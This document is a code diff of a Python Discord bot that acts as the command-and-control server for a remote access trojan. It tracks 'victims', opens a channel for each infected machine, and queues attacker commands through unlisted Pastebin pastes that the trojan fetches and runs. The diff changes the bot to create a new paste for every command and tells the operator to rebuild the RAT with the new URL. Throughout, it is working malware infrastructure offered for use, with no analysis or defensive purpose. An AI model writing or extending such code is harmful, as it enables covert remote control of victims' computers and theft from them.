@@ -185,40 +185,38 @@ import json
 import requests
 
 TOKEN = "YOUR_BOT_TOKEN_HERE"
-GUILD_ID = 123456789012345678      # Your server ID
-PASTEBIN_RAW = "https://pastebin.com/raw/XXXXXXXX"  # Your fixed Pastebin raw URL with {}
+GUILD_ID = 123456789012345678      # Server ID
+PASTEBIN_DEV_KEY = "YOUR_PASTEBIN_DEV_KEY_HERE"  # The unique one you put in
 
 intents = discord.Intents.default()
 intents.message_content = True
 intents.guilds = True
 intents.messages = True
 
-bot = commands.Bot(command_prefix="-", intents=intents)  # Commands start with -
+bot = commands.Bot(command_prefix="-", intents=intents)
 
 known_victims = set()
 
-# Load current commands from Pastebin
-def get_current_commands():
-    try:
-        return requests.get(PASTEBIN_RAW).json()
-    except:
-        return {}
-
-# Save updated commands back to Pastebin
-def update_commands(new_cmds):
+def queue_command(victim_id, full_cmd):
+    # Always create fresh paste
     data = {
-        "api_dev_key": "YOUR_PASTEBIN_DEV_KEY_HERE",  # Get from pastebin.com/api
+        "api_dev_key": PASTEBIN_DEV_KEY,
         "api_option": "paste",
-        "api_paste_code": json.dumps(new_cmds),
-        "api_paste_private": "1",
+        "api_paste_code": json.dumps({victim_id: full_cmd}),
+        "api_paste_private": "1",  # Unlisted
         "api_paste_name": "rat_cmds",
         "api_paste_expire_date": "N"
     }
     response = requests.post("https://pastebin.com/api/api_post.php", data=data)
     if "pastebin.com" in response.text:
-        print("[+] Commands updated successfully")
+        new_url = response.text.strip()
+        new_raw = new_url.replace("pastebin.com/", "pastebin.com/raw/")
+        print(f"[+] New command paste: {new_url}")
+        print(f"[+] New RAW URL for RAT rebuild: {new_raw}")
+        return new_raw
     else:
-        print("[-] Pastebin update failed")
+        print("[-] Pastebin error:", response.text)
+        return None
 
 async def create_victim_section(victim_id):
     guild = bot.get_guild(GUILD_ID)
@@ -242,37 +240,39 @@ async def create_victim_section(victim_id):
 
 @bot.event
 async def on_ready():
-    print(f"[+] {bot.user} online - full command control activated")
+    print(f"[+] {bot.user} online - type -ss in victim channels")
 
 @bot.event
 async def on_message(message):
     if message.author.bot: return
-    if not message.channel.category or not message.channel.category.name.startswith("Victim-"): 
-        await bot.process_commands(message)
-        return
     
-    # Extract victim ID from channel name (logs-abc12345)
-    match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
-    if not match: return
-    victim_id = match.group(1)
-    
-    # Process commands only in victim channels
-    if message.content.startswith("-"):
-        cmd = message.content[1:].strip().split(" ", 1)
-        command = cmd[0].lower()
-        arg = cmd[1] if len(cmd) > 1 else ""
-        
-        current = get_current_commands()
-        current[victim_id] = command + (" " + arg if arg else "")
-        
-        update_commands(current)
-        await message.reply(f"Queued **{command}** for victim **{victim_id}** → Executing now...")
-    
-    await bot.process_commands(message)
+    # Detect new bite in main webhook channel
+    if "WE GOT A BITE CAPTAIN" in (message.content + " ".join([e.title or "" + e.description or "" for e in message.embeds])):
+        match = re.search(r"\[([a-f0-9]{8})\]|Victim ID.*?([a-f0-9]{8})", message.content + " ".join([e.description or "" for e in message.embeds]), re.IGNORECASE)
+        if match:
+            victim_id = match.group(1) or match.group(2)
+            if victim_id not in known_victims:
+                known_victims.add(victim_id)
+                channel = await create_victim_section(victim_id)
+                if channel:
+                    await message.reply(f"**BITE** - Victim **{victim_id}** hooked\nWar room: {channel.mention}")
 
-# Optional: Add a global command in any channel (e.g., !status)
-@bot.command()
-async def status(ctx):
-    await ctx.send(f"Bot alive | {len(known_victims)} victims online")
+    # Commands in victim channels
+    if message.channel.name.startswith("logs-"):
+        match = re.search(r"logs-([a-f0-9]{8})", message.channel.name)
+        if match and message.content.startswith("-"):
+            victim_id = match.group(1)
+            cmd_parts = message.content[1:].strip().split(" ", 1)
+            command = cmd_parts[0].lower()
+            arg = cmd_parts[1] if len(cmd_parts) > 1 else ""
+            full_cmd = command + (" " + arg if arg else "")
+            
+            new_raw = queue_command(victim_id, full_cmd)
+            if new_raw:
+                await message.reply(f"**{full_cmd}** queued for **{victim_id}**\n**REBUILD RAT WITH THIS RAW URL:**\n{new_raw}")
+            else:
+                await message.reply("Pastebin shat itself - check console")
+
+    await bot.process_commands(message)
 
 bot.run(TOKEN)
